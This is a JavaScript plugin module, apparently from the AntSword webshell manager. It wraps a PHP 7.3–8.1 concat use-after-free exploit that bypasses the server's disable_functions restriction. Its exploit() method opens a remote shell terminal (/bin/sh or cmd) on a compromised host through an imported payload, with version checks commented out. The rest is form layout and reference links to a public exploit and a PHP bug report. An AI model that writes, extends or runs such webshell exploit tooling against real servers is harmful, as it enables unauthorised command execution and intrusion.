'use strict';

const Base = require('../base');
const LANG = require('../../language'); // 插件语言库
const LANG_T = antSword['language']['toastr']; // 通用通知提示
const nodeurl = require('url');
const {
  PHP_CONCAT_UAF_EXP
} = require('../../payload');
let PHP_CONCAT_UAF_LANG = LANG['core']['php_concat_uaf'];

class PHP_Concat_UAF extends Base {
  /**
   * 
   * @param {dhtmlxObject} cell 组件
   * @param {Object} top 上层对象
   */
  constructor(cell, top) {
    super(cell, top);
    if (this.precheck() == false) {
      return;
    }
    this.infodata = {
      ver: this.top.infodata.ver,
    };
    this.cell = cell;
    this.form = this.createForm(this.cell);
  }

  // 提前检测
  precheck() {
    let self = this;
    let infodata = self.top.infodata;
    // if (infodata.os.toLowerCase() !== "linux") {
    //   toastr.error(LANG['precheck']['only_linux'], LANG_T['error']);
    //   return false;
    // }
    // if (infodata.ver != "7.3" &&
    //   infodata.ver != "7.4" && infodata.ver != "8.0" && infodata.ver != "8.1") {
    //   toastr.error(PHP_CONCAT_UAF_LANG['err']['phpvererr'], LANG_T['error']);
    //   return false;
    // }
    return true;
  }

  createForm(cell) {
    let self = this;
    let form = cell.attachForm([{
        type: 'settings',
        position: 'label-left',
        labelWidth: 100,
        inputWidth: 300,
      }, {
        type: 'block',
        inputWidth: 'auto',
        list: [{
          type: 'label',
          labelWidth: 300,
          label: PHP_CONCAT_UAF_LANG['title']
        }, {
          type: 'block',
          inputWidth: 'auto',
          list: [{
              type: 'settings'
            },
            {
              type: "label",
              label: `<span>${PHP_CONCAT_UAF_LANG['status_cell']['ver']}</span>`,
            },
            {
              type: "newcolumn"
            },
            {
              type: "label",
              labelWidth: 300,
              label: `7.3 - all versions to date`,
            },
            {
              type: "label",
              labelWidth: 300,
              label: `7.4 - all versions to date`,
            },
            {
              type: "label",
              labelWidth: 300,
              label: `8.0 - all versions to date`,
            },
            {
              type: "label",
              labelWidth: 300,
              label: `8.1 - all versions to date`,
            }
          ],
        }]
      },
      {
        type: 'block',
        labelWidth: 100,
        inputWidth: 'auto',
        className: "display: flex;flex-direction: row;align-items: center;",
        list: [{
          type: 'label',
          label: '',
          name: 'status_label'
        }, {
          type: 'newcolumn',
          offset: 20
        }, {
          type: 'label',
          label: '',
          name: 'status_msg'
        }, ]
      },
      {
        type: 'block',
        inputWidth: 'auto',
        list: [{
          type: 'template',
          label: "Reference",
          style: "width:100%;",
          format: references
        }, ]
      }
    ], true);
    return form;
  }

  // 执行EXP, 必须有这个函数
  exploit() {
    let self = this;
    self.core = self.top.core;
    let binary = '/bin/sh'
    if(self.top.infodata.os.toLowerCase().startsWith('win')) {
      binary = 'cmd'
    }
    new antSword.module.terminal(self.top.opt, {
      exec: (arg = {
        bin: binary,
        cmd: ''
      }) => {
        return {
          _: PHP_CONCAT_UAF_EXP(arg['bin'], arg['cmd']),
        }
      }
    });
  }
}

function references(name, value) {
  let refs = {
    "PHP 7.3-8.1 disable_functions bypass [concat_function]": "https://github.com/mm0r1/exploits/tree/master/php-concat-bypass",
    "Bug #81705	type confusion/UAF on set_error_handler with concat operation": "https://bugs.php.net/bug.php?id=81705",
  };
  let ret = "";
  Object.keys(refs).map((k) => {
    ret += `<li style="padding-bottom: 10px;"><a href='${refs[k]}' target='blank'>${k}</a></li>`;
  })
  return `<div class='simple_link'><ul>${ret}</ul></div>`;
}

module.exports = PHP_Concat_UAF;